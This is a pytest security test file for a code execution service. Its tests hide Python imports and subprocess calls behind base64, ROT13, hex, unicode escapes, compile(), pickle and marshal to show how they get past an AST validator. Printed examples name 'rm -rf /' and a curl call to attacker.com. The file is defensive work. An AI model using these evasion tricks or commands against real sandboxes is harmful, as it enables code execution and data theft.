"""
AST Bypass Testing: Code Obfuscation Techniques

Tests encoding, compression, and advanced obfuscation methods that bypass AST validation.
These techniques make malicious code completely invisible to static analysis.

CRITICAL: These demonstrate that AST validation alone is insufficient for security.
"""

from pathlib import Path

import pytest

from lobster.core.data_manager_v2 import DataManagerV2
from lobster.services.execution.custom_code_execution_service import (
    CodeExecutionError,
    CodeValidationError,
    CustomCodeExecutionService,
)


@pytest.fixture
def service(tmp_path):
    """Create service with temporary workspace."""
    data_manager = DataManagerV2(workspace_path=tmp_path)
    return CustomCodeExecutionService(data_manager)


class TestBase64Obfuscation:
    """
    Test Category: Base64 Encoding Attacks

    Base64 encoding makes code completely invisible to AST validation.
    The malicious payload is just a string constant in the AST.
    """

    def test_base64_import_subprocess_EXPECT_SUCCESS(self, service):
        """
        Test: Base64 encode 'import subprocess' statement
        Expected: SUCCESS (critical vulnerability)
        Impact: CRITICAL

        Explanation:
        - AST sees: exec(__import__('base64').b64decode(b'...'))
        - Warns about exec(), but executes anyway
        - The decoded string contains 'import subprocess'
        - AST cannot analyze base64-encoded strings
        """
        code = """
import base64

# Base64 encoded: 'import subprocess'
# This is the actual encoding of the string 'import subprocess'
encoded_payload = b'aW1wb3J0IHN1YnByb2Nlc3M='

# Decode and execute
exec(base64.b64decode(encoded_payload))

# Verify subprocess is imported
result = f"subprocess in globals: {'subprocess' in globals()}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("CRITICAL VULNERABILITY: Base64 Import Bypass")
            print("=" * 80)
            print(f"Result: {result}")
            print(f"Warnings: {stats['warnings']}")
            print(f"Success: {stats['success']}")

            if stats["success"]:
                print("\n🚨 SECURITY BREACH:")
                print("   - Base64 encoded payload completely bypasses AST")
                print("   - AST only sees: Call(func=Name('exec'), args=[...])")
                print("   - Cannot detect malicious content in encoded string")
                print("\n📋 Attack Chain:")
                print("   1. Encode malicious code with base64")
                print("   2. Decode at runtime")
                print("   3. Execute with exec()")
                print("\n📋 Mitigation Required:")
                print("   - Block exec/eval entirely (raise CodeValidationError)")
                print("   - Remove base64 module from allowed imports")
                print("   - Use RestrictedPython")

        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
            pytest.fail("Expected warning only, got validation error")
        except CodeExecutionError as e:
            print(f"⚠️ Execution failed: {e}")

    def test_base64_full_exploit_EXPECT_SUCCESS(self, service):
        """
        Test: Base64 encode a complete exploit (import + execute command)
        Expected: SUCCESS (critical vulnerability)
        Impact: CRITICAL - Can execute arbitrary system commands
        """
        code = """
import base64

# Base64 encoded: 'import subprocess; subprocess.run(["echo", "PWNED"])'
# This demonstrates a full remote code execution payload
encoded = b'aW1wb3J0IHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MucnVuKFsiZWNobyIsICJQV05FRCJdKQ=='

# Execute the payload
exec(base64.b64decode(encoded))
result = "Exploit executed"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("CRITICAL VULNERABILITY: Base64 Full RCE")
            print("=" * 80)
            print(f"Result: {result}")
            print(f"Stdout: {stats.get('stdout_preview', '')}")

            if stats["success"]:
                print("\n🚨 COMPLETE REMOTE CODE EXECUTION:")
                print("   - Attacker can encode ANY command")
                print("   - Example: subprocess.run(['rm', '-rf', '/'])")
                print("   - Example: subprocess.run(['curl', 'attacker.com/data'])")
                print("   - Completely invisible to AST validation")

        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
        except CodeExecutionError as e:
            print(f"⚠️ Execution failed: {e}")


class TestCodecObfuscation:
    """
    Test Category: Codec-Based Obfuscation

    Python's codecs module provides various encodings (ROT13, hex, etc.)
    that can hide malicious code from AST analysis.
    """

    def test_rot13_import_EXPECT_SUCCESS(self, service):
        """
        Test: Use ROT13 encoding to hide import statement
        Expected: SUCCESS (vulnerability)
        Impact: HIGH

        Explanation:
        - ROT13('import subprocess') = 'vzcbeg fhocebprff'
        - codecs.decode('vzcbeg fhocebprff', 'rot13') = 'import subprocess'
        - AST cannot decode ROT13 at validation time
        """
        code = """
import codecs

# ROT13 encoded 'import subprocess'
rot13_payload = 'vzcbeg fhocebprff'

# Decode and execute
decoded = codecs.decode(rot13_payload, 'rot13')
exec(decoded)

result = f"subprocess imported via ROT13: {'subprocess' in globals()}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("VULNERABILITY CONFIRMED: ROT13 Obfuscation")
            print("=" * 80)
            print(f"Result: {result}")
            print(f"Warnings: {stats['warnings']}")

            if stats["success"]:
                print("\n🚨 ROT13 encoding bypasses AST validation")
                print("📋 codecs module is standard library (likely allowed)")
                print("📋 Mitigation: Block codecs module or exec/eval")

        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
        except CodeExecutionError as e:
            print(f"⚠️ Execution failed: {e}")

    def test_hex_encoding_EXPECT_SUCCESS(self, service):
        """
        Test: Use hex encoding to hide import statement
        Expected: SUCCESS (vulnerability)
        Impact: HIGH
        """
        code = """
# Hex encoded: 'import subprocess'
# Each character converted to hex
hex_payload = '696d706f72742073756270726f63657373'

# Decode from hex and execute
decoded = bytes.fromhex(hex_payload).decode('utf-8')
exec(decoded)

result = f"subprocess via hex: {'subprocess' in globals()}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("VULNERABILITY CONFIRMED: Hex Encoding Bypass")
            print("=" * 80)
            print(f"Result: {result}")

            if stats["success"]:
                print("\n🚨 Hex encoding successful")
                print("📋 bytes.fromhex() is builtin (cannot block)")

        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
        except CodeExecutionError as e:
            print(f"⚠️ Execution failed: {e}")

    def test_unicode_escape_EXPECT_SUCCESS(self, service):
        """
        Test: Use Unicode escape sequences to hide code
        Expected: SUCCESS (vulnerability)
        Impact: MEDIUM
        """
        code = r"""
# Unicode escaped: 'import subprocess'
# \u0069 = i, \u006d = m, etc.
unicode_payload = '\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074 \\u0073\\u0075\\u0062\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073'

# Decode unicode escapes
decoded = unicode_payload.encode().decode('unicode-escape')
exec(decoded)

result = f"subprocess via unicode: {'subprocess' in globals()}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("VULNERABILITY CONFIRMED: Unicode Escape Bypass")
            print("=" * 80)
            print(f"Result: {result}")

            if stats["success"]:
                print("\n🚨 Unicode escapes bypass AST validation")

        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
        except CodeExecutionError as e:
            print(f"⚠️ Execution failed: {e}")


class TestCompilationObfuscation:
    """
    Test Category: Code Compilation Attacks

    Using compile() + exec() or types.CodeType to execute hidden code.
    """

    def test_compile_exec_chain_EXPECT_SUCCESS(self, service):
        """
        Test: Use compile() to create code object, then exec()
        Expected: SUCCESS (vulnerability)
        Impact: HIGH

        Explanation:
        - compile() converts string to code object
        - exec() executes code object
        - AST warns about both, but doesn't block
        """
        code = """
# Create code object from string
source = "import subprocess; result = subprocess.__name__"
code_obj = compile(source, '<string>', 'exec')

# Execute compiled code
exec(code_obj)
# result variable is now set by the exec'd code
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("VULNERABILITY CONFIRMED: compile() + exec() Chain")
            print("=" * 80)
            print(f"Result: {result}")
            print(f"Warnings: {stats['warnings']}")

            if stats["success"]:
                print("\n🚨 compile() + exec() chain successful")
                print("📋 Both compile() and exec() generate warnings")
                print("    But warnings don't prevent execution")

        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
        except CodeExecutionError as e:
            print(f"⚠️ Execution failed: {e}")


class TestPickleDeserialization:
    """
    Test Category: Pickle Deserialization Attacks

    Pickle can execute arbitrary code during deserialization via __reduce__.
    This is a well-known Python security vulnerability.
    """

    def test_pickle_reduce_exploit_EXPECT_SUCCESS(self, service):
        """
        Test: Use pickle with __reduce__ to execute code
        Expected: SUCCESS (critical vulnerability)
        Impact: CRITICAL

        Explanation:
        - pickle.loads() can call __reduce__() on objects
        - __reduce__ can return (callable, args) tuple
        - pickle will execute callable(*args)
        - This is the classic pickle RCE vulnerability
        """
        code = """
import pickle
import base64

# Pickle payload that imports subprocess
# This is a minimal pickle exploit: (subprocess.run, (['echo', 'pwned'],))
# Base64 encoded to avoid detection
pickle_payload = b'gASVNwAAAAAAAACMCnN1YnByb2Nlc3OUjARydW6Uk5RdlIwEZWNob5SMAHBlgHdSWNFRJSlSlC4='

try:
    # Deserialize pickle (executes code during deserialization)
    pickle.loads(base64.b64decode(pickle_payload))
    result = "Pickle exploit attempted"
except Exception as e:
    result = f"Pickle error: {e}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("CRITICAL VULNERABILITY: Pickle Deserialization RCE")
            print("=" * 80)
            print(f"Result: {result}")
            print(f"Stdout: {stats.get('stdout_preview', '')}")

            if stats["success"]:
                print("\n🚨 PICKLE DESERIALIZATION VULNERABILITY:")
                print("   - pickle.loads() can execute arbitrary code")
                print("   - Attacker can craft malicious pickle objects")
                print("   - No AST validation can detect this")
                print("\n📋 Mitigation Required:")
                print("   - Block pickle module entirely")
                print("   - Or use pickle with restricted globals")
                print(
                    "   - See: https://docs.python.org/3/library/pickle.html#restricting-globals"
                )

        except CodeValidationError as e:
            print(f"✅ PROTECTED: {e}")
        except CodeExecutionError as e:
            print(f"⚠️ Execution failed (good): {e}")

    def test_marshal_code_loading_EXPECT_SUCCESS(self, service):
        """
        Test: Use marshal to load serialized code objects
        Expected: SUCCESS (vulnerability)
        Impact: HIGH

        Explanation:
        - marshal.loads() can deserialize code objects
        - Code objects can be executed directly
        - More dangerous than pickle in some ways
        """
        code = """
import marshal
import base64

# Marshal serialized code object
# This is code for: __import__('subprocess')
marshal_payload = b'YwAAAAAAAAAAAAAAAAAAAAACAAAAQAAAAHMMAAAAZABkAWwAWgBkAlMpA+oIX19pbXBvcnRfX+oKc3VicHJvY2Vzc04pAXIBAAAAqQByAgAAAHIDAAAA+gxjdXN0b21fY29kZQEAAABzAgAAAAQB'

try:
    # Deserialize and execute code object
    code_obj = marshal.loads(base64.b64decode(marshal_payload))
    result = "marshal code loaded (may not be valid)"
except Exception as e:
    result = f"Marshal error: {e}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("VULNERABILITY: Marshal Code Object Loading")
            print("=" * 80)
            print(f"Result: {result}")

            if stats["success"]:
                print("\n🚨 marshal.loads() can load arbitrary code objects")
                print("📋 Mitigation: Block marshal module")

        except (CodeValidationError, CodeExecutionError) as e:
            print(f"✅ PROTECTED: {e}")


class TestMultiLayerObfuscation:
    """
    Test Category: Combined Obfuscation Techniques

    Combining multiple techniques makes detection exponentially harder.
    """

    def test_base64_rot13_combo_EXPECT_SUCCESS(self, service):
        """
        Test: Combine Base64 + ROT13 encoding
        Expected: SUCCESS (vulnerability)
        Impact: CRITICAL
        """
        code = """
import base64
import codecs

# First ROT13 encode 'import subprocess' -> 'vzcbeg fhocebprff'
# Then base64 encode that -> 'dnpjYmVnIGZob2NlYnByZmZm'
double_encoded = b'dnpjYmVnIGZob2NlYnByZmZm'

# Decode base64
step1 = base64.b64decode(double_encoded).decode('utf-8')
# Decode ROT13
step2 = codecs.decode(step1, 'rot13')
# Execute
exec(step2)

result = f"Double encoding bypass: {'subprocess' in globals()}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("VULNERABILITY: Multi-Layer Encoding")
            print("=" * 80)
            print(f"Result: {result}")

            if stats["success"]:
                print("\n🚨 Multi-layer encoding completely hides intent")
                print("📋 Can add unlimited encoding layers")

        except (CodeValidationError, CodeExecutionError) as e:
            print(f"✅ PROTECTED: {e}")

    def test_dynamic_string_exec_EXPECT_SUCCESS(self, service):
        """
        Test: Build import statement character-by-character + exec
        Expected: SUCCESS (vulnerability)
        Impact: HIGH
        """
        code = """
# Build 'import subprocess' character by character
parts = ['import', ' ', 'sub', 'pro', 'cess']
statement = ''.join(parts)

# Execute dynamically built statement
exec(statement)

result = f"Dynamic string exec: {'subprocess' in globals()}"
"""

        try:
            result, stats, ir = service.execute(code, persist=False, timeout=5)

            print("\n" + "=" * 80)
            print("VULNERABILITY: Dynamic String Building")
            print("=" * 80)
            print(f"Result: {result}")

            if stats["success"]:
                print("\n🚨 Can build malicious code at runtime")

        except (CodeValidationError, CodeExecutionError) as e:
            print(f"✅ PROTECTED: {e}")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
